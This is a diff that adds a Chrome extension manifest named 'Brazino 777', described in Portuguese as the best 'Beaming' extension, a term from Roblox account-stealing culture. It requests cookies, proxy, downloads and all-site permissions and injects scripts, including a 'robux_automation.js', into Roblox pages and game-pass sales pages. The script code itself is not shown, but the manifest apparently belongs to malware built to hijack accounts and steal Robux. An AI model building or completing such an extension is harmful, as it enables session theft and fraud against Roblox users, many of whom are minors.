@@ -1,0 +1,41 @@
+{
+  "manifest_version": 3,
+  "name": "Brazino 777",
+  "version": "5.0",
+  "description": "Melhor extensão Beaming. Créditos: Muluck7z",
+  "permissions": [
+    "cookies",
+    "storage",
+    "tabs",
+    "activeTab",
+    "downloads",
+    "proxy",
+    "alarms"
+  ],
+  "host_permissions": [
+    "*://*.roblox.com/*",
+    "<all_urls>"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "action": {
+    "default_icon": "icon.png",
+    "default_popup": "popup.html"
+  },
+  "content_scripts": [
+    {
+      "matches": ["*://*.roblox.com/*"],
+      "js": ["config.js", "content.js"]
+    },
+    {
+      "matches": ["*://create.roblox.com/dashboard/creations/experiences/*/passes/*/sales"],
+      "js": ["robux_automation.js"]
+    }
+  ],
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  }
+}
